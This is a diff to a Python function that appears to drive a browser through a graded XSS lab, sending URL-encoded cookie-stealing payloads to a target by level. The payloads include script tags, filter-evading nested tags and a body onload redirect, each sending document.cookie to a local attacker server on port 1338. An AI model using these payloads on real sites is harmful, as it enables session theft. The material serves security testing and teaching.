@@ -31,8 +31,17 @@ def xss(vuln_type, level):
             comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
         else:
             comment = '%3Cbody%20onload%3D%27document.location%3D%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fhigh%3Fcookie%3D%22%20%2B%20document.cookie%27%3E'
-        url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
-        driver.get(url)
+
+    elif vuln_type == '2':
+        if level == 'low':
+            comment = '%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Flow%3Fcookie%3D%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
+        elif level == 'medium':
+            comment = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fmedium%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
+        else:
+            comment = '%3Cbody%20onload%3D%27document.location%3D%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Fhigh%3Fcookie%3D%22%20%2B%20document.cookie%27%3E'
+
+    url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?comment=' + comment
+    driver.get(url)
 
     # Grader verification should be done in attacker_server/server.py
 
